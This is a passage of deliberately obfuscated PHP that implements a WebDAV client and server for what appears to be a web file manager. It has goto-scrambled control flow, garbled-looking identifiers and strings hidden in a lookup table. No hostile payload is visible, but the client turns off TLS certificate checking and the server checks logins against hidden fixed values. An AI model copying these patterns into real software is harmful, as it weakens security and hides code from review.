$fîí÷†½ÅÑ[1911] => $A‰†ºäáÛÖ); return $this->where($dÅ·É……Ø‰)->delete(); } protected function removeBySource($bĞä´õ±Ì›) { $dØº“¯Ê±Û =& $_SERVER[°Óó£ÌİóèÅ]; $D‡§à²İË‹ = array($dØº“¯Ê±Û[1086] => USER_ID, $dØº“¯Ê±Û[1608] => $bĞä´õ±Ì›, $dØº“¯Ê±Û[1911] => array($dØº“¯Ê±Û[695], 0)); return $this->where($D‡§à²İË‹)->delete(); } } goto b¸Ó„Ï‰‹; Aã¿ƒğ°õ: class HttpDavClient { public function __construct($D‡Ù‰³ÆÁ, $dá ì—•çõ, $D“ï¥±ŒÀ¨) { $this->header = array(); $this->userName = $dá ì—•çõ; $this->userPassowrd = $D“ï¥±ŒÀ¨; } protected function makePath($d¸ò‹á„á) { return $d¸ò‹á„á; } protected function setHeader($A„Ç¹†Î‘³, $bæ°è”‘ô² = false) { if ($bæ°è”‘ô² === !1) { $this->header[] = $A„Ç¹†Î‘³; } else { $this->header[] = $A„Ç¹†Î‘³ . $_SERVER[°Óó£ÌİóèÅ][647] . $bæ°è”‘ô²; } } public function move($BéÑÕ®²İ, $D—˜ãç‘´, $aÜİ¾Ùô–  = '') { $a‘¥àˆ½¯½ =& $_SERVER[°Óó£ÌİóèÅ]; $this->setHeader($a‘¥àˆ½¯½[1197], $this->makePath($D—˜ãç‘´)); $this->setHeader($a‘¥àˆ½¯½[1198], $a‘¥àˆ½¯½[1199]); if ($aÜİ¾Ùô– ) { $this->setHeader($a‘¥àˆ½¯½[1200], $a‘¥àˆ½¯½[692] . $aÜİ¾Ùô–  . $a‘¥àˆ½¯½[695]); } return $this->send($a‘¥àˆ½¯½[1201], $BéÑÕ®²İ); } public function copy($AÅ•¯Í³èİ, $b¬®ğ¢„Î‘) { $CÕ¿Šë‚¿ƒ =& $_SERVER[°Óó£ÌİóèÅ]; $this->setHeader($CÕ¿Šë‚¿ƒ[1197], $this->makePath($b¬®ğ¢„Î‘)); $this->setHeader($CÕ¿Šë‚¿ƒ[1198], $CÕ¿Šë‚¿ƒ[1199]); return $this->send($CÕ¿Šë‚¿ƒ[1202], $AÅ•¯Í³èİ); } public function mkcol($cÒ‰›±Œ‰ˆ) { $a‘ÑÄõó­‰ =& $_SERVER[°Óó£ÌİóèÅ]; $this->setHeader($a‘ÑÄõó­‰[1198], $a‘ÑÄõó­‰[1199]); return $this->send($a‘ÑÄõó­‰[1203], $cÒ‰›±Œ‰ˆ); } public function delete($fäÌµÂ¬¸Å, $fŞ—¥¯ˆó = '') { $F‡ğ´³¡Ú =& $_SERVER[°Óó£ÌİóèÅ]; if ($fŞ—¥¯ˆó) { $this->setHeader($F‡ğ´³¡Ú[1200], $F‡ğ´³¡Ú[692] . $fŞ—¥¯ˆó . $F‡ğ´³¡Ú[695]); } return $this->send($F‡ğ´³¡Ú[1204], $fäÌµÂ¬¸Å); } public function propfind($A¹ö‰ñ¶µ) { $Dì¨Í¢øŠÜ =& $_SERVER[°Óó£ÌİóèÅ]; $this->setHeader($Dì¨Í¢øŠÜ[1205], $Dì¨Í¢øŠÜ[384]); $this->setHeader($Dì¨Í¢øŠÜ[1206], $Dì¨Í¢øŠÜ[1207]); $B§²Úæêí = $Dì¨Í¢øŠÜ[1208]; return $this->send($Dì¨Í¢øŠÜ[1209], $A¹ö‰ñ¶µ, $B§²Úæêí); } public function options($Bß‡Å¡›Œ) { return $this->send($_SERVER[°Óó£ÌİóèÅ][1210], $Bß‡Å¡›Œ); } public function get($c®ìÜÄéËƒ) { return $this->send($_SERVER[°Óó£ÌİóèÅ][231], $c®ìÜÄéËƒ); } public function put($aè…¿½©”, $c¾¥œŸ£Éà, $BÃõ²ÆÂ„Ì = '') { $Fï†ò³ÊÕÓ =& $_SERVER[°Óó£ÌİóèÅ]; if ($BÃõ²ÆÂ„Ì) { $this->setHeader($Fï†ò³ÊÕÓ[1200], $Fï†ò³ÊÕÓ[692] . $BÃõ²ÆÂ„Ì . $Fï†ò³ÊÕÓ[695]); } return $this->send($Fï†ò³ÊÕÓ[229], $aè…¿½©”, $c¾¥œŸ£Éà); } protected function send($FÂÃÃ®ñ¡ƒ, $aù‹™š¼÷, $FˆƒÓô©Œ¾ = false, $DÑæñ™×é– = false) { goto d‘´«×õ†; c´í•Ÿî³¤: $C“ê‡ÁÛ¼Ç = curl_init($aù‹™š¼÷); curl_setopt($C“ê‡ÁÛ¼Ç, CURLOPT_CUSTOMREQUEST, $FÂÃÃ®ñ¡ƒ); curl_setopt($C“ê‡ÁÛ¼Ç, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto E™ğ•“‰™°; F¥”æÆáØš: curl_setopt($C“ê‡ÁÛ¼Ç, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($C“ê‡ÁÛ¼Ç, CURLOPT_SSL_VERIFYHOST, !1); $cö™›×äÕÙ = curl_exec($C“ê‡ÁÛ¼Ç); goto F‹ç©¯ÄÉ„; E™ğ•“‰™°: curl_setopt($C“ê‡ÁÛ¼Ç, CURLOPT_HTTPHEADER, $this->header); curl_setopt($C“ê‡ÁÛ¼Ç, CURLOPT_RETURNTRANSFER, !0); curl_setopt($C“ê‡ÁÛ¼Ç, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto F¥”æÆáØš; F‹ç©¯ÄÉ„: $this->header = array(); return $cö™›×äÕÙ; goto Aí’Şì‘¨; d‘´«×õ†: $dÎçÌ·ó­ï =& $_SERVER[°Óó£ÌİóèÅ]; $B†Õ‡ôùëÏ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($dÎçÌ·ó­ï[1211], $dÎçÌ·ó­ï[50]); goto bˆç¹ÕË² ; bˆç¹ÕË² : $this->setHeader($B†Õ‡ôùëÏ); if ($FˆƒÓô©Œ¾) { $FˆƒÓô©Œ¾ = $dÎçÌ·ó­ï[1212] . $FˆƒÓô©Œ¾; } if (!request_url_safe($aù‹™š¼÷)) { return !1; } goto c´í•Ÿî³¤; Aí’Şì‘¨: } } class HttpDavServer { public function __construct($D´‚Óêíù, $EŒ˜ì´èÎ×) { $this->root = $D´‚Óêíù; $this->initPath($EŒ˜ì´èÎ×); $this->start(); } public function initPath($aİ«ó©à² ) { $D™†œÃªóÑ =& $_SERVER[°Óó£ÌİóèÅ]; $cÖ›„ê—„ˆ = rtrim($_SERVER[$D™†œÃªóÑ[445]], $D™†œÃªóÑ[8]) . $D™†œÃªóÑ[8]; $this->urlBase = substr($cÖ›„ê—„ˆ, 0, strpos($cÖ›„ê—„ˆ, $aİ«ó©à² ) + 1); $this->urlBase = rtrim($this->urlBase, $D™†œÃªóÑ[8]) . $aİ«ó©à² ; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $fÚ¤óìÊè§ =& $_SERVER[°Óó£ÌİóèÅ]; $E´Æ„¦¯Ë = HttpAuth::get(); if ($E´Æ„¦¯Ë[$fÚ¤óìÊè§[424]] == $fÚ¤óìÊè§[1213] && $E´Æ„¦¯Ë[$fÚ¤óìÊè§[664]] == $fÚ¤óìÊè§[1214]) { return !0; } HttpAuth::error(); } public function start() { goto A«ÅÊÂÜ’; b¬ğäöØÍ: if (!method_exists($this, $c…Ò§áŠ)) { pr($c…Ò§áŠ . $bÈœÈ×ºÌĞ[1215]); die; } $b®ô—°ªèË = array($bÈœÈ×ºÌĞ[1216], $bÈœÈ×ºÌĞ[1217]); if (!in_array($c…Ò§áŠ, $b®ô—°ªèË) && !$this->pathExists($this->path)) { $c„½Ãº™ = array($bÈœÈ×ºÌĞ[781] => 404); } else { $c„½Ãº™ = $this->{$c…Ò§áŠ}(); } goto c¢ğ¶ÅÃ; c¢ğ¶ÅÃ: if (!$c„½Ãº™) { return; } self::response($c„½Ãº™); goto aäÀÂ×ê®; A«ÅÊÂÜ’: $bÈœÈ×ºÌĞ =& $_SERVER[°Óó£ÌİóèÅ]; $this->checkUser(); $c…Ò§áŠ = $bÈœÈ×ºÌĞ[149] . HttpHeader::method(); goto b¬ğäöØÍ; aäÀÂ×ê®: } public function pathGet($aáõÖçÄ = false) { $f±“‡×•éï =& $_SERVER[°Óó£ÌİóèÅ]; $e×Œ‡’ê¯™ = $aáõÖçÄ ? $_SERVER[$f±“‡×•éï[1218]] : $_SERVER[$f±“‡×•éï[445]]; $e×Œ‡’ê¯™ = KodIO::clear(rawurldecode($e×Œ‡’ê¯™)); if (!strstr($e×Œ‡’ê¯™, KodIO::clear($this->urlBase))) { return !1; } return substr($e×Œ‡’ê¯™, strpos($e×Œ‡’ê¯™, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($aŒ‰–šˆ˜ğ) { return file_exists($aŒ‰–šˆ˜ğ); } public function pathMkdir($fƒÖÀË¯œ) { return mkdir($fƒÖÀË¯œ, 511, !0); } public function pathInfo($Aİ¿¿–ã¦) { return path_info($Aİ¿¿–ã¦); } public function pathList($bŞÕÈ’Ù‡) { return path_list($bŞÕÈ’Ù‡); } public function pathOut($f»ß¶ŸÂË÷) { echo file_get_contents($f»ß¶ŸÂË÷); } public function pathPut($eŞëœÔ Ô, $f†“Ÿ°Ğ×Ë = '') { if (!$f†“Ÿ°Ğ×Ë) { return file_put_contents($eŞëœÔ Ô, $_SERVER[°Óó£ÌİóèÅ][33]); } return move_path($f†“Ÿ°Ğ×Ë, $eŞëœÔ Ô); } public function pathRemove($A£’·”¬ùÓ) { if (is_file($A£’·”¬ùÓ)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($c×÷¼–«¥¡, $f»›÷…ƒò·) { return move_path($c×÷¼–«¥¡, $f»›÷…ƒò·); } public function pathCopy($fÒÒß¢Ä‚, $fïÁÊ‹ˆ’) { return copy_dir($fÒÒß¢Ä‚, $fïÁÊ‹ˆ’); } public function parsePath($FÉÒÊ·Á“„) { return $FÉÒÊ·Á“„; } public function parseItem($DÅòõåùÁƒ) { goto BàŒÌÄßÒŞ; b†ÈÂà‘†: if (!trim($DÅòõåùÁƒ[$d”İÑƒ…ù°[114]])) { $DÅòõåùÁƒ[$d”İÑƒ…ù°[114]] = time(); } if (!trim($DÅòõåùÁƒ[$d”İÑƒ…ù°[195]])) { $DÅòõåùÁƒ[$d”İÑƒ…ù°[195]] = time(); } $E–Ëíñæê = array($d”İÑƒ…ù°[1219] => KodIO::clear($this->urlBase . $d”İÑƒ…ù°[8] . $A×ìêÓ†¥), $d”İÑƒ…ù°[114] => @gmdate($d”İÑƒ…ù°[1220], $DÅòõåùÁƒ[$d”İÑƒ…ù°[114]]), $d”İÑƒ…ù°[195] => @gmdate($d”İÑƒ…ù°[1221], $DÅòõåùÁƒ[$d”İÑƒ…ù°[195]]), $d”İÑƒ…ù°[86] => $DÅòõåùÁƒ[$d”İÑƒ…ù°[86]] ? $DÅòõåùÁƒ[$d”İÑƒ…ù°[86]] : 0); goto eöãî¸¿; eöãî¸¿: return $E–Ëíñæê; goto B£ª©´³Ò; BàŒÌÄßÒŞ: $d”İÑƒ…ù° =& $_SERVER[°Óó£ÌİóèÅ]; $A×ìêÓ†¥ = $this->pathGet() . $d”İÑƒ…ù°[8] . $DÅòõåùÁƒ[$d”İÑƒ…ù°[28]]; $A×ìêÓ†¥ = str_replace($d”İÑƒ…ù°[177], $d”İÑƒ…ù°[8], rawurlencode($A×ìêÓ†¥)); goto b†ÈÂà‘†; B£ª©´³Ò: } public function parseItemXml($eíÁ£õÚòÕ) { $b·„Áµˆ£ =& $_SERVER[°Óó£ÌİóèÅ]; $cÓöÑ¨¦Üù = $this->parseItem($eíÁ£õÚòÕ); if ($eíÁ£õÚòÕ[$b·„Áµˆ£[29]] == $b·„Áµˆ£[85]) { $Eô‡«ƒøâë = $b·„Áµˆ£[1222]; $Eô‡«ƒøâë .= $b·„Áµˆ£[1223]; } else { $D†¯Ë²®— = $eíÁ£õÚòÕ[$b·„Áµˆ£[165]] ? $eíÁ£õÚòÕ[$b·„Áµˆ£[165]] : get_path_ext($eíÁ£õÚòÕ[$b·„Áµˆ£[28]]); $fğ°‡„Õà¶ = get_file_mime($D†¯Ë²®—); $Eô‡«ƒøâë = $b·„Áµˆ£[1224]; $Eô‡«ƒøâë .= "\74\x44\x3a\x67\145\164\143\x6f\x6e\x74\x65\156\x74\x74\171\x70\x65\x3e{$fğ°‡„Õà¶}\74\x2f\x44\x3a\x67\145\164\143\157\x6e\164\145\x6e\164\x74\171\x70\145\x3e"; } return "\12\x9\11\x3c\x44\x3a\162\145\163\x70\x6f\x6e\x73\x65\76\xa\x9\11\11\x3c\x44\72\x68\x72\x65\146\76{$cÓöÑ¨¦Üù[$b·„Áµˆ£[1219]]}\x3c\57\104\72\x68\162\x65\146\x3e\12\x9\x9\x9\x3c\x44\72\x70\x72\157\x70\163\164\x61\x74\x3e\12\11\11\11\x9\74\x44\x3a\x70\x72\x6f\x70\x3e\12\x9\x9\x9\x9\11\74\104\x3a\x67\x65\x74\154\141\x73\164\155\x6f\144\151\x66\151\145\x64\x3e{$cÓöÑ¨¦Üù[$b·„Áµˆ£[114]]}\74\x2f\104\x3a\x67\145\164\154\141\163\164\155\157\x64\151\x66\151\x65\144\76\xa\11\x9\11\x9\x9\74\104\72\143\162\x65\x61\164\x69\x6f\x6e\144\x61\164\x65\76{$cÓöÑ¨¦Üù[$b·„Áµˆ£[195]]}\x3c\x2f\104\72\x63\162\145\141\164\151\157\156\x64\x61\164\145\76\xa\11\x9\11\x9\x9\74\x44\x3a\x67\x65\x74\143\x6f\x6e\164\x65\156\164\x6c\x65\x6e\x67\164\150\76{$cÓöÑ¨¦Üù[$b·„Áµˆ£[86]]}\x3c\x2f\104\72\x67\x65\x74\x63\x6f\156\x74\145\156\164\154\145\156\147\x74\150\76\12\11\x9\11\11\11{$Eô‡«ƒøâë}\12\x9\x9\11\x9\74\57\104\72\160\162\157\160\76\12\11\x9\11\11\x3c\x44\x3a\x73\x74\141\x74\x75\163\76\x48\x54\x54\120\x2f\61\56\61\x20\62\x30\x30\40\117\113\x3c\57\104\x3a\163\x74\x61\x74\165\x73\x3e\xa\x9\x9\11\74\57\x44\72\160\x72\157\160\163\164\x61\164\76\12\11\x9\74\57\x44\72\162\x65\163\x70\x6f\x6e\x73\145\x3e"; } public function pathListMerge($b“ª²ŠĞÜ) { goto bİò“ô¬Ğë; AóÖîÔ‹Ğ: return $dïğÄŠ¤Ÿ; goto CÇ ¶ˆÊÕ; c”‚æÍ†‚Ø: $dïğÄŠ¤Ÿ = array(); foreach ($b“ª²ŠĞÜ as $e«øº˜’ëè => $F“¯ø¢¨çç) { if (!in_array($e«øº˜’ëè, $AöºîåÉ‚) || !is_array($F“¯ø¢¨çç)) { continue; } $dïğÄŠ¤Ÿ = array_merge($dïğÄŠ¤Ÿ, $F“¯ø¢¨çç); } foreach ($dïğÄŠ¤Ÿ as &$AÖÖ£ñå…×) { $AÖÖ£ñå…×[$D·¼Ğ¬ì§˜[28]] = str_replace($D·¼Ğ¬ì§˜[8], $D·¼Ğ¬ì§˜[1050], $AÖÖ£ñå…×[$D·¼Ğ¬ì§˜[28]]); } goto AóÖîÔ‹Ğ; bİò“ô¬Ğë: $D·¼Ğ¬ì§˜ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$b“ª²ŠĞÜ) { return $b“ª²ŠĞÜ; } $AöºîåÉ‚ = array($D·¼Ğ¬ì§˜[82], $D·¼Ğ¬ì§˜[83], $D·¼Ğ¬ì§˜[1225]); goto c”‚æÍ†‚Ø; CÇ ¶ˆÊÕ: } public function httpPROPFIND() { goto aÛ×ïÁ²Ÿ½; cŒ¤¦¨Åë¾: if (!is_array($aŠÌê“Ÿæ®)) { return array($aÕÓÛ›ªÊ˜[1226] => 404, $aÕÓÛ›ªÊ˜[1227] => $aÕÓÛ›ªÊ˜[1228]); } $CÅ¹ÀÔ§… = IO::info($this->path); $a¢äÔÄæİÅ = array($aÕÓÛ›ªÊ˜[395] => $aÕÓÛ›ªÊ˜[33], $aÕÓÛ›ªÊ˜[29] => $aÕÓÛ›ªÊ˜[85]); goto Fµ°±Šõ²Î; cåëÍ«Ú: return array($aÕÓÛ›ªÊ˜[1226] => 207, $aÕÓÛ›ªÊ˜[1227] => "\x3c\x44\x3a\x6d\x75\154\164\151\x73\x74\x61\x74\x75\163\x20\x78\x6d\154\156\163\x3a\104\75\x22\x44\101\126\x3a\42\76\xa{$eäÌĞŠ‰öÀ}\12\x3c\57\x44\x3a\155\x75\x6c\x74\x69\x73\164\141\x74\165\x73\76"); goto f»†‚ˆ‡î£; b¦ö·ï¶îø: if ($d¥Ù¸âŞ÷  == $aÕÓÛ›ªÊ˜[410]) { $aŠÌê“Ÿæ® = array($a¢äÔÄæİÅ); } else { $aŠÌê“Ÿæ® = array_merge(array($a¢äÔÄæİÅ), $aŠÌê“Ÿæ®); } $eäÌĞŠ‰öÀ = $aÕÓÛ›ªÊ˜[33]; foreach ($aŠÌê“Ÿæ® as $e­…ˆ¢Ò…) { $eäÌĞŠ‰öÀ .= $this->parseItemXml($e­…ˆ¢Ò…); } goto cåëÍ«Ú; Fµ°±Šõ²Î: if ($CÅ¹ÀÔ§…) { $a¢äÔÄæİÅ[$aÕÓÛ›ªÊ˜[195]] = $CÅ¹ÀÔ§…[$aÕÓÛ›ªÊ˜[195]]; $a¢äÔÄæİÅ[$aÕÓÛ›ªÊ˜[114]] = $CÅ¹ÀÔ§…[$aÕÓÛ›ªÊ˜[114]]; $a¢äÔÄæİÅ[$aÕÓÛ›ªÊ˜[165]] = $CÅ¹ÀÔ§…[$aÕÓÛ›ªÊ˜[165]]; $a¢äÔÄæİÅ[$aÕÓÛ›ªÊ˜[29]] = $CÅ¹ÀÔ§…[$aÕÓÛ›ªÊ˜[29]]; } $d¥Ù¸âŞ÷  = HttpHeader::get($aÕÓÛ›ªÊ˜[1205]); if ($a¢äÔÄæİÅ[$aÕÓÛ›ªÊ˜[29]] == $aÕÓÛ›ªÊ˜[172]) { $d¥Ù¸âŞ÷  = $aÕÓÛ›ªÊ˜[410]; } goto b¦ö·ï¶îø; aÛ×ïÁ²Ÿ½: $aÕÓÛ›ªÊ˜ =& $_SERVER[°Óó£ÌİóèÅ]; $aŠÌê“Ÿæ® = $this->pathList($this->path); $aŠÌê“Ÿæ® = $this->pathListMerge($aŠÌê“Ÿæ®); goto cŒ¤¦¨Åë¾; f»†‚ˆ‡î£: } public function httpHEAD() { $E»àÁß µÏ =& $_SERVER[°Óó£ÌİóèÅ]; $bµ¬Èù”„ù = $this->pathInfo($this->path); if (!$bµ¬Èù”„ù || $bµ¬Èù”„ù[$E»àÁß µÏ[29]] == $E»àÁß µÏ[85]) { return array($E»àÁß µÏ[781] => 200, $E»àÁß µÏ[940] => array($E»àÁß µÏ[1229])); } return array($E»àÁß µÏ[781] => 200, $E»àÁß µÏ[940] => array($E»àÁß µÏ[1230], $E»àÁß µÏ[143], $E»àÁß µÏ[1231] . $bµ¬Èù”„ù[$E»àÁß µÏ[86]], $E»àÁß µÏ[1232] . get_file_mime($bµ¬Èù”„ù[$E»àÁß µÏ[165]]), $E»àÁß µÏ[139] . gmdate($E»àÁß µÏ[1220], $bµ¬Èù”„ù[$E»àÁß µÏ[1233]]) . $E»àÁß µÏ[1234], $E»àÁß µÏ[1235])); } public function httpOPTIONS() { $eĞßÌœ–œ =& $_SERVER[°Óó£ÌİóèÅ]; return array($eĞßÌœ–œ[781] => 200, $eĞßÌœ–œ[940] => array($eĞßÌœ–œ[1236], $eĞßÌœ–œ[1237], $eĞßÌœ–œ[1238], $eĞßÌœ–œ[1195])); } public function httpPROPPATCH() { $AÊŒœ‚¾Šø =& $_SERVER[°Óó£ÌİóèÅ]; $c‡çŠ˜ßÒÄ = $AÊŒœ‚¾Šø[1239] . $_SERVER[$AÊŒœ‚¾Šø[445]] . $AÊŒœ‚¾Šø[1240]; return array($AÊŒœ‚¾Šø[1226] => 207, $AÊŒœ‚¾Šø[1227] => "\x3c\104\72\155\165\x6c\x74\x69\x73\x74\x61\164\165\x73\40\x78\155\154\x6e\163\72\x44\x3d\42\x44\x41\126\72\42\76\12{$c‡çŠ˜ßÒÄ}\xa\74\x2f\x44\72\x6d\165\154\x74\151\x73\x74\141\x74\165\163\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $aÀ×‰‰®©ä =& $_SERVER[°Óó£ÌİóèÅ]; $c‚”³¿ïå = $this->uploadFile(); if ($c‚”³¿ïå) { $Aªš¨¬É¢‡ = 204; } else { $c‚”³¿ïå = $aÀ×‰‰®©ä[33]; $Aªš¨¬É¢‡ = 201; } $Eª‘´†¿— = $this->pathPut($this->path, $c‚”³¿ïå); if ($Eª‘´†¿— == !1) { $Aªš¨¬É¢‡ = 404; } return array($aÀ×‰‰®©ä[1226] => $Aªš¨¬É¢‡); } private function uploadFile() { goto bŒ´¬éÊ±«; dÖíÓùÎÚì: while (!feof($Dõ‰‘Ö‰»•)) { fwrite($bŞÊ¼—‹¾§, fread($Dõ‰‘Ö‰»•, 1024 * 200)); } fclose($Dõ‰‘Ö‰»•); fclose($bŞÊ¼—‹¾§); goto e’ˆãíÄ°; B¼ñ¬œÊ®¢: $bŞÊ¼—‹¾§ = @fopen($FÂÃá¸´°, $eáí·ñêŞ[1168]); $Dõ‰‘Ö‰»• = @fopen($eáí·ñêŞ[1242], $eáí·ñêŞ[1167]); if (!$Dõ‰‘Ö‰»• || !$bŞÊ¼—‹¾§) { @unlink($FÂÃá¸´°); return !1; } goto dÖíÓùÎÚì; bŒ´¬éÊ±«: $eáí·ñêŞ =& $_SERVER[°Óó£ÌİóèÅ]; @mk_dir(TEMP_FILES); $FÂÃá¸´° = TEMP_FILES . $eáí·ñêŞ[1241] . rand_string(32); goto B¼ñ¬œÊ®¢; e’ˆãíÄ°: if (@filesize($FÂÃá¸´°) > 0) { return $FÂÃá¸´°; } @unlink($FÂÃá¸´°); return !1; goto Fé¬¯‰Ì™; Fé¬¯‰Ì™: } public function httpMKCOL() { $c²Œ²®‰š =& $_SERVER[°Óó£ÌİóèÅ]; if ($this->pathExists($this->path)) { return array($c²Œ²®‰š[781] => 409); } $F§ÂÑÁ›¬ = $this->pathMkdir($this->path); return array($c²Œ²®‰š[781] => $F§ÂÑÁ›¬ ? 201 : 403); } public function httpMOVE() { $CÔØ‹Ê‹ŸÉ =& $_SERVER[°Óó£ÌİóèÅ]; $dï’Ş·– = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$CÔØ‹Ê‹ŸÉ[1243]])) { $bŠïÊæÈù[$CÔØ‹Ê‹ŸÉ[1244]] = $_SERVER[$CÔØ‹Ê‹ŸÉ[1243]] == $CÔØ‹Ê‹ŸÉ[1245]; } $e—à–ÈóŒ = $this->pathMove($this->path, $dï’Ş·–); return array($CÔØ‹Ê‹ŸÉ[781] => $e—à–ÈóŒ ? 201 : 404); } public function httpCOPY() { $C¡®î×µê = $this->parsePath($this->pathGet(!0)); $E×ßó¬ñ·† = $this->pathCopy($this->path, $C¡®î×µê); return array($_SERVER[°Óó£ÌİóèÅ][781] => $E×ßó¬ñ·† ? 201 : 404); } public function httpDELETE() { $B”ÙÜ–×¤ê = $this->pathRemove($this->path); return array($_SERVER[°Óó£ÌİóèÅ][781] => $B”ÙÜ–×¤ê ? 200 : 503); } public function httpLOCK() { $c‹à‹©¶Í’ =& $_SERVER[°Óó£ÌİóèÅ]; $b²èñß¦·É = md5($this->path); $ağ˜°®ó•Ÿ = $c‹à‹©¶Í’[1246] . $this->xmlGet($c‹à‹©¶Í’[1247]) . $c‹à‹©¶Í’[1248] . $b²èñß¦·É . $c‹à‹©¶Í’[1249]; return array($c‹à‹©¶Í’[781] => 200, $c‹à‹©¶Í’[940] => array($c‹à‹©¶Í’[1250] . $b²èñß¦·É, $c‹à‹©¶Í’[1251]), $c‹à‹©¶Í’[1252] => $ağ˜°®ó•Ÿ); } public function httpUNLOCK() { return array($_SERVER[°Óó£ÌİóèÅ][781] => 204); } public function xmlGet($fƒÑé‹Àö–) { goto bõÌ¹¶Ü˜; fÀ®ŠÔ’—å: $C™¥ï•ì¤ª = array_shift(explode($døÜ’¦áî”[8], $fƒÑé‹Àö–)); $A»‘åÔÊ®Ã = $b™»ù¶ë¤->getElementsByTagNameNS($døÜ’¦áî”[1254], $C™¥ï•ì¤ª); if ($A»‘åÔÊ®Ã) { return $A»‘åÔÊ®Ã[0]->nodeValue; } goto f¯ùË¸çÔ‰; bõÌ¹¶Ü˜: $døÜ’¦áî” =& $_SERVER[°Óó£ÌİóèÅ]; static $b™»ù¶ë¤ = false; if (!$b™»ù¶ë¤) { $f³ÌÖÄí©¾ = file_get_contents($døÜ’¦áî”[1253]); $b™»ù¶ë¤ = new DOMDocument(); $b™»ù¶ë¤->loadXML($f³ÌÖÄí©¾); } goto fÀ®ŠÔ’—å; f¯ùË¸çÔ‰: return $døÜ’¦áî”[33]; goto AÉÍÜéê»; AÉÍÜéê»: } public static function response($FÆ‰Ê•Î) { goto C®ÓÚ—ºÕ‹; C®ÓÚ—ºÕ‹: $EÑË­ ÊÇ =& $_SERVER[°Óó£ÌİóèÅ]; $aÌÒ¯‘ÔÀĞ = is_array($FÆ‰Ê•Î[$EÑË­ ÊÇ[940]]) ? $FÆ‰Ê•Î[$EÑË­ ÊÇ[940]] : array(); $aÌÒ¯‘ÔÀĞ[] = HttpHeader::code($FÆ‰Ê•Î[$EÑË­ ÊÇ[781]]); goto Aó¤°½ë§´; Aó¤°½ë§´: $aÌÒ¯‘ÔÀĞ[] = $EÑË­ ÊÇ[1193]; $aÌÒ¯‘ÔÀĞ[] = $EÑË­ ÊÇ[1194]; foreach ($aÌÒ¯‘ÔÀĞ as $d‚Š²¿†¯) { header($d‚Š²¿†¯); } goto FƒƒêÛëÅˆ; FƒƒêÛëÅˆ: if (is_string($FÆ‰Ê•Î[$EÑË­ ÊÇ[1252]])) { header($EÑË­ ÊÇ[1255]); $DáùµÛ¥º = $EÑË­ ÊÇ[1256] . $EÑË­ ÊÇ[61] . $FÆ‰Ê•Î[$EÑË­ ÊÇ[1252]]; echo $DáùµÛ¥º; } goto aåšš®ˆ§Œ; aåšš®ˆ§Œ: } } class HttpHeader { public static $_headers = array("\x48\157\163\164" => "\x48\124\124\120\137\110\x4f\x53\x54", "\x55\x73\145\162\x2d\x41\147\x65\x6e\x74" => "\x48\x54\x54\120\137\125\123\105\122\x5f\x41\x47\105\x4e\x54", "\103\157\156\x74\x65\x6e\x74\x2d\x54\x79\x70\x65" => "\x48\x54\x54\x50\x5f\x43\x4f\x4e\x54\105\116\x54\x5f\x54\x59\x50\x45", "\103\x6f\x6e\x74\145\x6e\x74\55\114\x65\156\147\x74\150" => "\x48\124\x54\x50\137\103\x4f\116\x54\105\116\124\x5f\x4c\105\x4e\107\124\x48", "\x44\x65\160\164\150" => "\110\x54\x54\120\x5f\104\105\120\x54\x48", "\x45\x78\x70\x65\143\x74" => "\110\x54\x54\120\137\105\130\x50\105\103\124", "\x49\146\x2d\116\157\156\x65\55\x4d\x61\164\143\x68" => "\x48\124\124\120\137\x49\x46\137\116\117\x4e\105\x5f\x4d\x41\124\103\x48", "\111\x66\x2d\x4d\x61\164\143\150" => "\x48\124\124\120\137\x49\x46\137\115\x41\x54\x43\110", "\x49\x66\x2d\x52\x61\x6e\x67\145" => "\x48\x54\124\120\137\x49\106\x5f\x52\101\116\x47\x45", "\x4c\x61\163\164\x2d\x4d\157\144\151\x66\151\145\x64" => "\110\x54\x54\120\x5f\114\101\x53\124\x5f\115\x4f\x44\111\x46\x49\105\104", "\111\146\55\115\157\x64\x69\146\151\x65\x64\x2d\x53\x69\x6e\143\x65" => "\110\x54\x54\x50\137\x49\x46\x5f\x4d\x4f\x44\x49\106\111\x45\104\137\123\111\x4e\x43\105", "\x49\146\55\125\x6e\x6d\x6f\x64\151\x66\151\x65\144\x2d\123\x69\156\143\x65" => "\x48\x54\x54\x50\x5f\x49\x46\137\x55\116\115\x4f\104\x49\x46\111\x45\x44\x5f\x53\x49\116\103\x45", "\x52\141\156\x67\145" => "\x48\x54\124\120\x5f\122\101\x4e\x47\105", "\x54\x69\155\x65\157\x75\x74" => "\x48\x54\x54\x50\x5f\124\x49\115\105\117\125\124", "\111\x66" => "\x48\x54\x54\x50\x5f\x49\106", "\114\157\x63\x6b\55\x54\157\153\145\156" => "\110\124\124\120\137\x4c\x4f\x43\113\137\124\117\113\x45\x4e", "\x4f\166\x65\x72\x77\162\151\164\145" => "\x48\124\124\x50\137\117\126\105\122\127\x52\x49\124\x45", "\104\x65\x73\x74\151\156\141\164\x69\157\156" => "\x48\x54\124\x50\137\x44\x45\x53\x54\111\116\101\x54\x49\x4f\116", "\x52\145\x71\x75\x65\163\x74\x2d\111\144" => "\x52\105\121\x55\x45\x53\124\x5f\x49\x44", "\x52\145\161\165\145\x73\x74\x2d\102\x6f\x64\171\55\x46\151\154\145" => "\122\105\x51\x55\x45\x53\x54\x5f\x42\x4f\104\x59\x5f\x46\x49\114\105", "\122\145\144\x69\162\145\x63\164\x2d\123\164\141\x74\165\163" => "\122\x45\x44\x49\x52\105\103\124\x5f\123\124\x41\x54\125\x53"); public static function init() { static $c±àÆˆ”öº = false; if ($c±àÆˆ”öº) { return; } foreach ($_SERVER as $AàÜ¼®¼Íâ => $D¼Ü›Êïˆ) { $AàÜ¼®¼Íâ = strtoupper($AàÜ¼®¼Íâ); if (!array_key_exists($AàÜ¼®¼Íâ, $_SERVER)) { continue; } $_SERVER[$AàÜ¼®¼Íâ] = $D¼Ü›Êïˆ; } foreach (self::$_headers as $AàÜ¼®¼Íâ => $fò›¹ç) { if (!array_key_exists($AàÜ¼®¼Íâ, $_SERVER)) { continue; } 